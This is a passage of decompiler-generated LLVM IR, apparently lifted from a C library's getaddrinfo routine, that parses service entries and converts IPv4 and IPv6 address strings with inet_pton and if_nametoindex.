  %v4_26910 = sext i8 %v3_26910 to i32
  store i32 %v4_26910, i32* %r3.global-to-local, align 4
  %v9_26914 = icmp eq i32 %v3_268d0, %v4_26910
  br i1 %v9_26914, label %dec_label_pc_26964, label %dec_label_pc_2691c

dec_label_pc_2691c:                               ; preds = %dec_label_pc_26910
  %v1_2691c = add i32 %v0_26928, 2
  %v2_2691c = inttoptr i32 %v1_2691c to i8*
  %v3_2691c = load i8, i8* %v2_2691c, align 1
  %v4_2691c = zext i8 %v3_2691c to i32
  store i32 %v4_2691c, i32* %r3.global-to-local, align 4
  %v1_26920 = and i32 %v4_2691c, 2
  %v2_26920 = icmp eq i32 %v1_26920, 0
  br i1 %v2_26920, label %dec_label_pc_26928, label %dec_label_pc_26964

dec_label_pc_26928:                               ; preds = %dec_label_pc_2691c, %dec_label_pc_268fc
  %v1_26928 = add i32 %v0_26928, 7
  br label %dec_label_pc_2693c

dec_label_pc_26930:                               ; preds = %bb274, %dec_label_pc_268e4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36368), i32* %r3.global-to-local, align 4
  br label %dec_label_pc_2693c

dec_label_pc_2693c:                               ; preds = %dec_label_pc_26928, %dec_label_pc_26930
  %v0_26928 = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36361), %dec_label_pc_26930 ], [ %v1_26928, %dec_label_pc_26928 ]
  store i32 %v0_26928, i32* @r1, align 4
  %v1_2693c = add i32 %v0_26928, 3
  %v2_2693c = inttoptr i32 %v1_2693c to i8*
  %v3_2693c = load i8, i8* %v2_2693c, align 1
  %v4_2693c = zext i8 %v3_2693c to i32
  store i32 %v4_2693c, i32* %r3.global-to-local, align 4
  %v2_26940 = icmp eq i8 %v3_2693c, 0
  %v3_26944 = load i32, i32* %v2_268e4, align 4
  store i32 %v3_26944, i32* %r2.global-to-local, align 4
  %v2_2694c = icmp eq i32 %v3_26944, 0
  br i1 %v2_26940, label %dec_label_pc_2694c, label %dec_label_pc_268f4

dec_label_pc_2694c:                               ; preds = %dec_label_pc_2693c
  br i1 %v2_2694c, label %dec_label_pc_272f0, label %bb275

bb275:                                            ; preds = %dec_label_pc_2694c
  store i32 263, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2730c

dec_label_pc_2695c:                               ; preds = %dec_label_pc_268e4
  store i32 -36368, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36368), i32* @r1, align 4
  br label %dec_label_pc_26964

dec_label_pc_26964:                               ; preds = %dec_label_pc_2691c, %dec_label_pc_26910, %dec_label_pc_26908, %dec_label_pc_2695c
  %v0_26afc = phi i32 [ add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -36368), %dec_label_pc_2695c ], [ %v0_26928, %dec_label_pc_26908 ], [ %v0_26928, %dec_label_pc_26910 ], [ %v0_26928, %dec_label_pc_2691c ]
  store i32 %v2_268bc, i32* %r3.global-to-local, align 4
  %v0_26968 = load i32, i32* @r6, align 4
  %v2_26968 = icmp eq i32 %v0_26968, 0
  store i32 %v2_268bc, i32* %stack_var_-52, align 4
  br i1 %v2_26968, label %dec_label_pc_26aa8, label %dec_label_pc_26974

dec_label_pc_26974:                               ; preds = %dec_label_pc_26964
  %v1_26974 = add i32 %v0_26afc, 2
  %v2_26974 = inttoptr i32 %v1_26974 to i8*
  %v3_26974 = load i8, i8* %v2_26974, align 1
  %v4_26974 = zext i8 %v3_26974 to i32
  store i32 %v4_26974, i32* %r3.global-to-local, align 4
  %tmp332 = urem i8 %v3_26974, 2
  %v1_26978 = zext i8 %tmp332 to i32
  store i32 %v1_26978, i32* %r2.global-to-local, align 4
  %v2_26978 = icmp eq i8 %tmp332, 0
  br i1 %v2_26978, label %dec_label_pc_26980, label %dec_label_pc_272f0

dec_label_pc_26980:                               ; preds = %dec_label_pc_26974
  %v1_26980 = add i32 %v0_26968, 4
  %v2_26980 = inttoptr i32 %v1_26980 to i32*
  %v3_26980 = load i32, i32* %v2_26980, align 4
  store i32 %v3_26980, i32* %r3.global-to-local, align 4
  %v1_26984 = icmp slt i32 %v3_26980, 0
  br i1 %v1_26984, label %dec_label_pc_2698c, label %dec_label_pc_26a64

dec_label_pc_2698c:                               ; preds = %dec_label_pc_26980
  %v1_2698c = add i32 %v0_26afc, 3
  %v2_2698c = inttoptr i32 %v1_2698c to i8*
  %v3_2698c = load i8, i8* %v2_2698c, align 1
  %v4_2698c = zext i8 %v3_2698c to i32
  store i32 %v4_2698c, i32* %r3.global-to-local, align 4
  %v2_26990 = icmp eq i8 %v3_2698c, 0
  br i1 %v2_26990, label %dec_label_pc_26a44.preheader, label %dec_label_pc_269a0

dec_label_pc_26a44.preheader:                     ; preds = %dec_label_pc_2698c
  %v2_26994 = add i32 %v0_26afc, 7
  store i32 %v2_26994, i32* @r5, align 4
  %v3_26998 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v3_26998, i32* @sl, align 4
  %v1_26a44124 = add i32 %v0_26afc, 10
  %v2_26a44125 = inttoptr i32 %v1_26a44124 to i8*
  %v3_26a44126 = load i8, i8* %v2_26a44125, align 1
  %v4_26a44127 = zext i8 %v3_26a44126 to i32
  store i32 %v4_26a44127, i32* %r3.global-to-local, align 4
  %v2_26a48128 = icmp eq i8 %v3_26a44126, 0
  br i1 %v2_26a48128, label %dec_label_pc_26a50, label %dec_label_pc_269c8.lr.ph

dec_label_pc_269c8.lr.ph:                         ; preds = %dec_label_pc_26a44.preheader
  %v2_26a10 = ptrtoint i32* %stack_var_-216 to i32
  br label %dec_label_pc_269c8

dec_label_pc_269a0:                               ; preds = %dec_label_pc_2698c
  %v2_269a4 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_269a4, i32* %ip.global-to-local, align 4
  %v1_269a8 = inttoptr i32 %v0_26968 to i32*
  %v2_269a8 = load i32, i32* %v1_269a8, align 4
  store i32 %v2_269a8, i32* %r0.global-to-local, align 4
  store i32 %v2_269a4, i32* @r3, align 4
  store i32 %v0_268d0, i32* @r2, align 4
  store i32 %v2_269a4, i32* %stack_var_-52, align 4
  %v1_269b8 = call i32 @gaih_inet_serv(i32 %v2_269a8)
  store i32 %v1_269b8, i32* %r0.global-to-local, align 4
  %v2_269bc = icmp eq i32 %v1_269b8, 0
  br i1 %v2_269bc, label %dec_label_pc_26b44, label %dec_label_pc_2730c

dec_label_pc_269c8:                               ; preds = %dec_label_pc_269c8.lr.ph, %dec_label_pc_26a40
  %v0_26a18 = phi i32 [ %v2_26994, %dec_label_pc_269c8.lr.ph ], [ %v1_26a40, %dec_label_pc_26a40 ]
  %v1_269c8 = add i32 %v0_26a18, 2
  %v2_269c8 = inttoptr i32 %v1_269c8 to i8*
  %v3_269c8 = load i8, i8* %v2_269c8, align 1
  %v4_269c8 = zext i8 %v3_269c8 to i32
  store i32 %v4_269c8, i32* %r1.global-to-local, align 4
  %tmp333 = urem i8 %v3_269c8, 2
  %v2_269cc = icmp eq i8 %tmp333, 0
  br i1 %v2_269cc, label %dec_label_pc_269d4, label %dec_label_pc_26a40

dec_label_pc_269d4:                               ; preds = %dec_label_pc_269c8
  %v0_269d4 = load i32, i32* @r8, align 4
  %v1_269d4 = add i32 %v0_269d4, 8
  %v2_269d4 = inttoptr i32 %v1_269d4 to i32*
  %v3_269d4 = load i32, i32* %v2_269d4, align 4
  store i32 %v3_269d4, i32* %r2.global-to-local, align 4
  %v2_269d8 = icmp eq i32 %v3_269d4, 0
  br i1 %v2_269d8, label %dec_label_pc_269ec, label %dec_label_pc_269e0

dec_label_pc_269e0:                               ; preds = %dec_label_pc_269d4
  %v1_269e0 = inttoptr i32 %v0_26a18 to i8*
  %v2_269e0 = load i8, i8* %v1_269e0, align 1
  %v3_269e0 = sext i8 %v2_269e0 to i32
  store i32 %v3_269e0, i32* %r3.global-to-local, align 4
  %v9_269e4 = icmp eq i32 %v3_269d4, %v3_269e0
  br i1 %v9_269e4, label %dec_label_pc_269ec, label %dec_label_pc_26a40

dec_label_pc_269ec:                               ; preds = %dec_label_pc_269e0, %dec_label_pc_269d4
  %v1_269ec = add i32 %v0_269d4, 12
  %v2_269ec = inttoptr i32 %v1_269ec to i32*
  %v3_269ec = load i32, i32* %v2_269ec, align 4
  store i32 %v3_269ec, i32* %r2.global-to-local, align 4
  %v2_269f0 = icmp eq i32 %v3_269ec, 0
  br i1 %v2_269f0, label %dec_label_pc_26a0c, label %dec_label_pc_269f8

dec_label_pc_269f8:                               ; preds = %dec_label_pc_269ec
  %v1_269f8 = and i32 %v4_269c8, 2
  %v2_269f8 = icmp eq i32 %v1_269f8, 0
  br i1 %v2_269f8, label %dec_label_pc_26a00, label %dec_label_pc_26a0c

dec_label_pc_26a00:                               ; preds = %dec_label_pc_269f8
  %v1_26a00 = add i32 %v0_26a18, 1
  %v2_26a00 = inttoptr i32 %v1_26a00 to i8*
  %v3_26a00 = load i8, i8* %v2_26a00, align 1
  %v4_26a00 = sext i8 %v3_26a00 to i32
  store i32 %v4_26a00, i32* %r3.global-to-local, align 4
  %v9_26a04 = icmp eq i32 %v3_269ec, %v4_26a00
  br i1 %v9_26a04, label %dec_label_pc_26a0c, label %dec_label_pc_26a40

dec_label_pc_26a0c:                               ; preds = %dec_label_pc_26a00, %dec_label_pc_269f8, %dec_label_pc_269ec
  store i32 %v2_26a10, i32* @r4, align 4
  %v0_26a14 = load i32, i32* @r6, align 4
  %v1_26a14 = inttoptr i32 %v0_26a14 to i32*
  %v2_26a14 = load i32, i32* %v1_26a14, align 4
  store i32 %v2_26a14, i32* %r0.global-to-local, align 4
  store i32 %v0_26a18, i32* @r1, align 4
  store i32 %v0_269d4, i32* @r2, align 4
  store i32 %v2_26a10, i32* @r3, align 4
  %v4_26a24 = call i32 @gaih_inet_serv(i32 %v2_26a14)
  store i32 %v4_26a24, i32* %r0.global-to-local, align 4
  %v2_26a28 = icmp eq i32 %v4_26a24, 0
  br i1 %v2_26a28, label %.thread29, label %dec_label_pc_26a38

.thread29:                                        ; preds = %dec_label_pc_26a0c
  %v2_26a2c = load i32, i32* @sl, align 4
  %v3_26a2c = inttoptr i32 %v2_26a2c to i32*
  store i32 %v2_26a10, i32* %v3_26a2c, align 4
  store i32 %v2_26a10, i32* @sl, align 4
  br label %dec_label_pc_26a40

dec_label_pc_26a38:                               ; preds = %dec_label_pc_26a0c
  %v1_26a38 = and i32 %v4_26a24, 256
  %v2_26a38 = icmp eq i32 %v1_26a38, 0
  br i1 %v2_26a38, label %dec_label_pc_2730c, label %dec_label_pc_26a40

dec_label_pc_26a40:                               ; preds = %.thread29, %dec_label_pc_26a00, %dec_label_pc_269e0, %dec_label_pc_269c8, %dec_label_pc_26a38
  %v0_26a40 = load i32, i32* @r5, align 4
  %v1_26a40 = add i32 %v0_26a40, 7
  store i32 %v1_26a40, i32* @r5, align 4
  %v1_26a44 = add i32 %v0_26a40, 10
  %v2_26a44 = inttoptr i32 %v1_26a44 to i8*
  %v3_26a44 = load i8, i8* %v2_26a44, align 1
  %v4_26a44 = zext i8 %v3_26a44 to i32
  store i32 %v4_26a44, i32* %r3.global-to-local, align 4
  %v2_26a48 = icmp eq i8 %v3_26a44, 0
  br i1 %v2_26a48, label %dec_label_pc_26a44.dec_label_pc_26a50_crit_edge, label %dec_label_pc_269c8

dec_label_pc_26a44.dec_label_pc_26a50_crit_edge:  ; preds = %dec_label_pc_26a40
  %v3_26a50.pre = load i32, i32* %stack_var_-52, align 4
  br label %dec_label_pc_26a50

dec_label_pc_26a50:                               ; preds = %dec_label_pc_26a44.dec_label_pc_26a50_crit_edge, %dec_label_pc_26a44.preheader
  %v3_26a50 = phi i32 [ %v3_26a50.pre, %dec_label_pc_26a44.dec_label_pc_26a50_crit_edge ], [ %v2_268bc, %dec_label_pc_26a44.preheader ]
  store i32 %v3_26a50, i32* %r2.global-to-local, align 4
  store i32 %v2_268bc, i32* %r3.global-to-local, align 4
  %v9_26a58 = icmp eq i32 %v3_26a50, %v2_268bc
  br i1 %v9_26a58, label %dec_label_pc_272f0, label %dec_label_pc_26b44

dec_label_pc_26a64:                               ; preds = %dec_label_pc_26980
  %v2_26a68 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_26a68, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-216, align 4
  %v1_26a70 = inttoptr i32 %v0_26afc to i8*
  %v2_26a70 = load i8, i8* %v1_26a70, align 1
  %v3_26a70 = sext i8 %v2_26a70 to i32
  store i32 %v3_26a70, i32* %r3.global-to-local, align 4
  %v3_26a78 = load i8, i8* %v2_26974, align 1
  %v4_26a78 = zext i8 %v3_26a78 to i32
  store i32 %v4_26a78, i32* %r3.global-to-local, align 4
  %v1_26a7c = and i32 %v4_26a78, 2
  %v2_26a7c = icmp eq i32 %v1_26a7c, 0
  %v3_26a80 = load i32, i32* %v2_26980, align 4
  %v3_26a84 = mul i32 %v3_26a80, 65536
  store i32 %v3_26a84, i32* %r3.global-to-local, align 4
  %tmp276 = mul i32 %v3_26a80, 256
  %v3_26a88 = and i32 %tmp276, 16776960
  store i32 %v3_26a88, i32* %r2.global-to-local, align 4
  br i1 %v2_26a7c, label %.thread31, label %bb277

bb277:                                            ; preds = %dec_label_pc_26a64
  %v4_26a8c = load i32, i32* %v2_268d0, align 4
  br label %bb278

.thread31:                                        ; preds = %dec_label_pc_26a64
  %v2_26a90 = add i32 %v0_26afc, 1
  %v3_26a90 = inttoptr i32 %v2_26a90 to i8*
  %v4_26a90 = load i8, i8* %v3_26a90, align 1
  %v5_26a90 = sext i8 %v4_26a90 to i32
  br label %bb278

bb278:                                            ; preds = %bb277, %.thread31
  %storemerge220 = phi i32 [ %v4_26a8c, %bb277 ], [ %v5_26a90, %.thread31 ]
  store i32 %storemerge220, i32* %r1.global-to-local, align 4
  %v1_26a94 = and i32 %tmp276, 65280
  %tmp279 = udiv i32 %v3_26a80, 256
  %v4_26a98 = urem i32 %tmp279, 256
  %v5_26a98 = or i32 %v4_26a98, %v1_26a94
  store i32 %v5_26a98, i32* %r2.global-to-local, align 4
  store i32 %v2_26a68, i32* %stack_var_-52, align 4
  br label %dec_label_pc_26af0

dec_label_pc_26aa8:                               ; preds = %dec_label_pc_26964
  %v1_26aa8 = add i32 %v0_268d0, 8
  %v2_26aa8 = inttoptr i32 %v1_26aa8 to i32*
  %v3_26aa8 = load i32, i32* %v2_26aa8, align 4
  store i32 %v3_26aa8, i32* %r3.global-to-local, align 4
  %v2_26aac = icmp eq i32 %v3_26aa8, 0
  br i1 %v2_26aac, label %dec_label_pc_26ab4, label %dec_label_pc_26ac0

dec_label_pc_26ab4:                               ; preds = %dec_label_pc_26aa8
  %v3_26ab4 = load i32, i32* %v2_268d0, align 4
  store i32 %v3_26ab4, i32* %r3.global-to-local, align 4
  %v2_26ab8 = icmp eq i32 %v3_26ab4, 0
  br i1 %v2_26ab8, label %dec_label_pc_26afc, label %dec_label_pc_26ac0

dec_label_pc_26ac0:                               ; preds = %dec_label_pc_26aa8, %dec_label_pc_26ab4
  %v2_26ac4 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_26ac4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-216, align 4
  %v1_26acc = inttoptr i32 %v0_26afc to i8*
  %v2_26acc = load i8, i8* %v1_26acc, align 1
  %v3_26acc = sext i8 %v2_26acc to i32
  store i32 %v3_26acc, i32* %r3.global-to-local, align 4
  %v1_26ad4 = add i32 %v0_26afc, 2
  %v2_26ad4 = inttoptr i32 %v1_26ad4 to i8*
  %v3_26ad4 = load i8, i8* %v2_26ad4, align 1
  %v4_26ad4 = zext i8 %v3_26ad4 to i32
  store i32 %v4_26ad4, i32* %r3.global-to-local, align 4
  %v1_26ad8 = and i32 %v4_26ad4, 2
  %v2_26ad8 = icmp eq i32 %v1_26ad8, 0
  br i1 %v2_26ad8, label %.thread32, label %bb280

bb280:                                            ; preds = %dec_label_pc_26ac0
  %v4_26adc = load i32, i32* %v2_268d0, align 4
  br label %bb281

.thread32:                                        ; preds = %dec_label_pc_26ac0
  %v2_26ae0 = add i32 %v0_26afc, 1
  %v3_26ae0 = inttoptr i32 %v2_26ae0 to i8*
  %v4_26ae0 = load i8, i8* %v3_26ae0, align 1
  %v5_26ae0 = sext i8 %v4_26ae0 to i32
  br label %bb281

bb281:                                            ; preds = %bb280, %.thread32
  %storemerge226 = phi i32 [ %v4_26adc, %bb280 ], [ %v5_26ae0, %.thread32 ]
  store i32 %storemerge226, i32* %r1.global-to-local, align 4
  store i32 %v2_26ac4, i32* %stack_var_-52, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_26af0

dec_label_pc_26af0:                               ; preds = %bb278, %bb281
  %v0_26af4 = phi i32 [ %v5_26a98, %bb278 ], [ 0, %bb281 ]
  %v3_26af0 = phi i32 [ %v2_26a68, %bb278 ], [ %v2_26ac4, %bb281 ]
  store i32 %v3_26af0, i32* %r3.global-to-local, align 4
  %v2_26af4 = add i32 %v3_26af0, 12
  %v3_26af4 = inttoptr i32 %v2_26af4 to i32*
  store i32 %v0_26af4, i32* %v3_26af4, align 4
  br label %dec_label_pc_26b44

dec_label_pc_26afc:                               ; preds = %dec_label_pc_26ab4
  %v1_26afc = add i32 %v0_26afc, 7
  store i32 %v1_26afc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %storemerge4116 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %storemerge4116, i32* @ip, align 4
  %v1_26b38118 = add i32 %v0_26afc, 10
  %v2_26b38119 = inttoptr i32 %v1_26b38118 to i8*
  %v3_26b38120 = load i8, i8* %v2_26b38119, align 1
  %v4_26b38121 = zext i8 %v3_26b38120 to i32
  store i32 %v4_26b38121, i32* %r3.global-to-local, align 4
  %v2_26b3c122 = icmp eq i8 %v3_26b38120, 0
  br i1 %v2_26b3c122, label %dec_label_pc_26b44, label %dec_label_pc_26b0c.lr.ph

dec_label_pc_26b0c.lr.ph:                         ; preds = %dec_label_pc_26afc
  %v2_26b10 = ptrtoint i32* %stack_var_-216 to i32
  br label %dec_label_pc_26b0c

dec_label_pc_26b0c:                               ; preds = %dec_label_pc_26b0c.dec_label_pc_26b0c_crit_edge, %dec_label_pc_26b0c.lr.ph
  %v1_26b2c = phi i32 [ %v2_26b10, %dec_label_pc_26b0c.dec_label_pc_26b0c_crit_edge ], [ %storemerge4116, %dec_label_pc_26b0c.lr.ph ]
  %v0_26b18 = phi i32 [ %v1_26b30, %dec_label_pc_26b0c.dec_label_pc_26b0c_crit_edge ], [ %v1_26afc, %dec_label_pc_26b0c.lr.ph ]
  %v0_26b14 = phi i32 [ %v0_26b14.pre, %dec_label_pc_26b0c.dec_label_pc_26b0c_crit_edge ], [ 0, %dec_label_pc_26b0c.lr.ph ]
  store i32 %v2_26b10, i32* %r3.global-to-local, align 4
  store i32 %v0_26b14, i32* %stack_var_-216, align 4
  %v1_26b18 = inttoptr i32 %v0_26b18 to i8*
  %v2_26b18 = load i8, i8* %v1_26b18, align 1
  %v3_26b18 = sext i8 %v2_26b18 to i32
  store i32 %v3_26b18, i32* %r2.global-to-local, align 4
  %v1_26b20 = add i32 %v0_26b18, 1
  %v2_26b20 = inttoptr i32 %v1_26b20 to i8*
  %v3_26b20 = load i8, i8* %v2_26b20, align 1
  %v4_26b20 = sext i8 %v3_26b20 to i32
  store i32 %v4_26b20, i32* %r2.global-to-local, align 4
  %v2_26b2c = inttoptr i32 %v1_26b2c to i32*
  store i32 %v2_26b10, i32* %v2_26b2c, align 4
  %v0_26b30 = load i32, i32* %r1.global-to-local, align 4
  %v1_26b30 = add i32 %v0_26b30, 7
  store i32 %v1_26b30, i32* %r1.global-to-local, align 4
  store i32 %v2_26b10, i32* @ip, align 4
  %v1_26b38 = add i32 %v0_26b30, 10
  %v2_26b38 = inttoptr i32 %v1_26b38 to i8*
  %v3_26b38 = load i8, i8* %v2_26b38, align 1
  %v4_26b38 = zext i8 %v3_26b38 to i32
  store i32 %v4_26b38, i32* %r3.global-to-local, align 4
  %v2_26b3c = icmp eq i8 %v3_26b38, 0
  br i1 %v2_26b3c, label %dec_label_pc_26b44, label %dec_label_pc_26b0c.dec_label_pc_26b0c_crit_edge

dec_label_pc_26b0c.dec_label_pc_26b0c_crit_edge:  ; preds = %dec_label_pc_26b0c
  %v0_26b14.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26b0c

dec_label_pc_26b44:                               ; preds = %dec_label_pc_26b0c, %dec_label_pc_26afc, %dec_label_pc_26a50, %dec_label_pc_269a0, %dec_label_pc_26af0
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_26b48 = load i32, i32* @r7, align 4
  %v2_26b48 = icmp eq i32 %v0_26b48, 0
  store i32 0, i32* %stack_var_-56, align 4
  %v2_26fb8 = ptrtoint i32* %stack_var_-232 to i32
  br i1 %v2_26b48, label %dec_label_pc_26fb4, label %dec_label_pc_26b54

dec_label_pc_26b54:                               ; preds = %dec_label_pc_26b44
  store i32 %v2_26fb8, i32* %stack_var_-56, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-232, align 4
  %v5_26b6c = ptrtoint i32* %stack_var_-224 to i32
  store i32 %v5_26b6c, i32* %r2.global-to-local, align 4
  store i32 %v0_26b48, i32* %r1.global-to-local, align 4
  %v3_26b74 = inttoptr i32 %v0_26b48 to i8*
  %v4_26b74 = call i32 @inet_pton(i32 2, i8* %v3_26b74, i32 %v5_26b6c)
  store i32 %v4_26b74, i32* %r0.global-to-local, align 4
  %tmp282 = icmp slt i32 %v4_26b74, 1
  br i1 %tmp282, label %dec_label_pc_26ba8, label %dec_label_pc_26b80

dec_label_pc_26b80:                               ; preds = %dec_label_pc_26b54
  %v0_26b80 = load i32, i32* @r8, align 4
  %v1_26b80 = add i32 %v0_26b80, 4
  %v2_26b80 = inttoptr i32 %v1_26b80 to i32*
  %v3_26b80 = load i32, i32* %v2_26b80, align 4
  store i32 %v3_26b80, i32* %r3.global-to-local, align 4
  %v2_26b84 = icmp eq i32 %v3_26b80, 0
  br i1 %v2_26b84, label %dec_label_pc_26b9c, label %bb283

bb283:                                            ; preds = %dec_label_pc_26b80
  %v8_26b88 = icmp eq i32 %v3_26b80, 2
  br i1 %v8_26b88, label %dec_label_pc_26b9c, label %dec_label_pc_26b90

dec_label_pc_26b90:                               ; preds = %bb283
  store i32 %v0_268c8, i32* %r0.global-to-local, align 4
  %v2_26b94 = icmp eq i32 %v0_268c8, 0
  br i1 %v2_26b94, label %dec_label_pc_272f8, label %dec_label_pc_26b9c

dec_label_pc_26b9c:                               ; preds = %dec_label_pc_26b80, %dec_label_pc_26b90, %bb283
  %v3_26b9c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_26b9c, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v2_26ba4 = add i32 %v3_26b9c, 4
  %v3_26ba4 = inttoptr i32 %v2_26ba4 to i32*
  store i32 2, i32* %v3_26ba4, align 4
  br label %dec_label_pc_26ba8

dec_label_pc_26ba8:                               ; preds = %dec_label_pc_26b54, %dec_label_pc_26b9c
  %v3_26ba8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_26ba8, i32* %r3.global-to-local, align 4
  %v1_26bac = add i32 %v3_26ba8, 4
  %v2_26bac = inttoptr i32 %v1_26bac to i32*
  %v3_26bac = load i32, i32* %v2_26bac, align 4
  store i32 %v3_26bac, i32* @r6, align 4
  %v2_26bb0 = icmp eq i32 %v3_26bac, 0
  br i1 %v2_26bb0, label %dec_label_pc_26bb8, label %dec_label_pc_26ca8

dec_label_pc_26bb8:                               ; preds = %dec_label_pc_26ba8
  %v0_26bb8 = load i32, i32* @r7, align 4
  %v1_26bb8 = inttoptr i32 %v0_26bb8 to i8*
  store i32 %v0_26bb8, i32* %r0.global-to-local, align 4
  %v3_26bbc = call i32 @strlen(i8* %v1_26bb8)
  %v1_26bc0 = add i32 %v3_26bbc, 15
  %v1_26bc4 = and i32 %v1_26bc0, -8
  store i32 %v1_26bc4, i32* @r3, align 4
  %v1_26bc8 = load i32, i32* @sp, align 4
  %v2_26bc8 = sub i32 %v1_26bc8, %v1_26bc4
  %v1_26bcc = add i32 %v3_26bbc, 1
  store i32 %v1_26bcc, i32* @r2, align 4
  %v0_26bd0 = load i32, i32* @r7, align 4
  store i32 %v0_26bd0, i32* @r1, align 4
  %v1_26bd4 = add i32 %v2_26bc8, 16
  store i32 %v1_26bd4, i32* @r0, align 4
  %v0_26bd8 = call i32 @memcpy()
  store i32 %v0_26bd8, i32* @r0, align 4
  store i32 37, i32* %r1.global-to-local, align 4
  store i32 %v0_26bd8, i32* @r4, align 4
  %v2_26be4 = call i32 @__GI_strchr(i32 %v0_26bd8, i32 37)
  store i32 %v2_26be4, i32* %r0.global-to-local, align 4
  store i32 %v2_26be4, i32* @r5, align 4
  %v3_26be8 = icmp eq i32 %v2_26be4, 0
  br i1 %v3_26be8, label %bb285, label %bb284

bb284:                                            ; preds = %dec_label_pc_26bb8
  %v1_26bec = load i32, i32* @r6, align 4
  %v2_26bec = trunc i32 %v1_26bec to i8
  %v4_26bec = inttoptr i32 %v2_26be4 to i8*
  store i8 %v2_26bec, i8* %v4_26bec, align 1
  br label %bb285

bb285:                                            ; preds = %dec_label_pc_26bb8, %bb284
  %v3_26bf0 = load i32, i32* %stack_var_-56, align 4
  %v0_26bf4 = load i32, i32* @r4, align 4
  store i32 %v0_26bf4, i32* %r1.global-to-local, align 4
  %v1_26bf8 = add i32 %v3_26bf0, 8
  store i32 %v1_26bf8, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_26c00 = inttoptr i32 %v0_26bf4 to i8*
  %v4_26c00 = call i32 @inet_pton(i32 10, i8* %v3_26c00, i32 %v1_26bf8)
  store i32 %v4_26c00, i32* %r0.global-to-local, align 4
  %tmp286 = icmp slt i32 %v4_26c00, 1
  br i1 %tmp286, label %dec_label_pc_26ca8, label %dec_label_pc_26c0c

dec_label_pc_26c0c:                               ; preds = %bb285
  %v0_26c0c = load i32, i32* @r8, align 4
  %v1_26c0c = add i32 %v0_26c0c, 4
  %v2_26c0c = inttoptr i32 %v1_26c0c to i32*
  %v3_26c0c = load i32, i32* %v2_26c0c, align 4
  store i32 %v3_26c0c, i32* %r3.global-to-local, align 4
  %v2_26c10 = icmp eq i32 %v3_26c0c, 0
  br i1 %v2_26c10, label %dec_label_pc_26c1c, label %bb287

bb287:                                            ; preds = %dec_label_pc_26c0c
  %v8_26c14 = icmp eq i32 %v3_26c0c, 10
  br i1 %v8_26c14, label %dec_label_pc_26c1c, label %dec_label_pc_272f8

dec_label_pc_26c1c:                               ; preds = %dec_label_pc_26c0c, %bb287
  %v3_26c1c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_26c1c, i32* @r4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v0_26c24 = load i32, i32* @r5, align 4
  %v2_26c24 = icmp eq i32 %v0_26c24, 0
  %v2_26c28 = add i32 %v3_26c1c, 4
  %v3_26c28 = inttoptr i32 %v2_26c28 to i32*
  store i32 10, i32* %v3_26c28, align 4
  br i1 %v2_26c24, label %dec_label_pc_26ca8, label %dec_label_pc_26c30

dec_label_pc_26c30:                               ; preds = %dec_label_pc_26c1c
  %v0_26c30 = load i32, i32* @r4, align 4
  %v1_26c30 = add i32 %v0_26c30, 8
  %v2_26c30 = inttoptr i32 %v1_26c30 to i32*
  %v3_26c30 = load i32, i32* %v2_26c30, align 4
  %v2_26c38 = and i32 %v3_26c30, 49407
  store i32 %v2_26c38, i32* %r2.global-to-local, align 4
  store i32 33022, i32* %r3.global-to-local, align 4
  %v9_26c40 = icmp eq i32 %v2_26c38, 33022
  br i1 %v9_26c40, label %dec_label_pc_26c64, label %dec_label_pc_26c48

dec_label_pc_26c48:                               ; preds = %dec_label_pc_26c30
  %v2_26c48 = inttoptr i32 %v1_26c30 to i8*
  %v3_26c48 = load i8, i8* %v2_26c48, align 1
  %v4_26c48 = zext i8 %v3_26c48 to i32
  store i32 %v4_26c48, i32* %r3.global-to-local, align 4
  %v2_26c4c = icmp eq i8 %v3_26c48, -1
  br i1 %v2_26c4c, label %dec_label_pc_26c54, label %dec_label_pc_26c80

dec_label_pc_26c54:                               ; preds = %dec_label_pc_26c48
  %v1_26c54 = add i32 %v0_26c30, 9
  %v2_26c54 = inttoptr i32 %v1_26c54 to i8*
  %v3_26c54 = load i8, i8* %v2_26c54, align 1
  %tmp334 = urem i8 %v3_26c54, 16
  %v1_26c58 = zext i8 %tmp334 to i32
  store i32 %v1_26c58, i32* %r3.global-to-local, align 4
  %v7_26c5c = icmp eq i8 %tmp334, 2
  br i1 %v7_26c5c, label %dec_label_pc_26c64, label %dec_label_pc_26c80

dec_label_pc_26c64:                               ; preds = %dec_label_pc_26c54, %dec_label_pc_26c30
  %v0_26c64 = load i32, i32* @r5, align 4
  %v1_26c64 = add i32 %v0_26c64, 1
  store i32 %v1_26c64, i32* %r0.global-to-local, align 4
  %v1_26c68 = call i32 @__GI_if_nametoindex(i32 %v1_26c64)
  store i32 %v1_26c68, i32* %r0.global-to-local, align 4
  %v3_26c6c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_26c6c, i32* %r3.global-to-local, align 4
  %v1_26c70 = load i32, i32* @r4, align 4
  %v2_26c70 = add i32 %v1_26c70, 24
  %v3_26c70 = inttoptr i32 %v2_26c70 to i32*
  store i32 %v1_26c68, i32* %v3_26c70, align 4
  %v0_26c74 = load i32, i32* %r3.global-to-local, align 4
  %v1_26c74 = add i32 %v0_26c74, 24
